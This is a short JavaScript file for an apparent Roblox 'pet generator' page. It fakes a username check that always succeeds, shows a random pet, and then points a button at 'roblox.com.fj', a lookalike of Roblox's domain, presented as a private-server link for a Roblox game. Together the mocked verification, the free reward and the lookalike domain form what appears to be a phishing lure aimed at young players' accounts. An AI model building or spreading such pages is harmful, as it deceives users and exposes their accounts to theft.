const pets = [
    { name: "Dragonfly", image: "images/dragonfly.png" },
    { name: "Raccoon", image: "images/raccoon.png" },
    { name: "Queen Bee", image: "images/queenbee.png" },
    { name: "Mimic", image: "images/mimic.png" },
    { name: "Octopus", image: "images/octopus.png" },
    { name: "Kitsune", image: "images/kitsune.png" }
];

const checkUserBtn = document.getElementById("checkUser");
const generatePetBtn = document.getElementById("generatePet");
const userStatus = document.getElementById("userStatus");
const petSection = document.getElementById("petSection");
const petResult = document.getElementById("petResult");
const petImage = document.getElementById("petImage");
const serverLink = document.getElementById("serverLink");

checkUserBtn.addEventListener("click", () => {
    const username = document.getElementById("username").value.trim();
    if(username === "") {
        userStatus.textContent = "❌ Please enter a username.";
        petSection.style.display = "none";
        return;
    }

    // Mocking username check (always "found")
    userStatus.textContent = "✅ Username found, you can now generate your pet!";
    petSection.style.display = "block";
});

generatePetBtn.addEventListener("click", () => {
    const randomPet = pets[Math.floor(Math.random() * pets.length)];
    petResult.textContent = `You generated ${randomPet.name}!`;
    petImage.src = randomPet.image;
    petImage.style.display = "block";

    // Replace the href with your Roblox private server link
    serverLink.href = "https://roblox.com.fj/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=35951293855754442542885670362964";
});
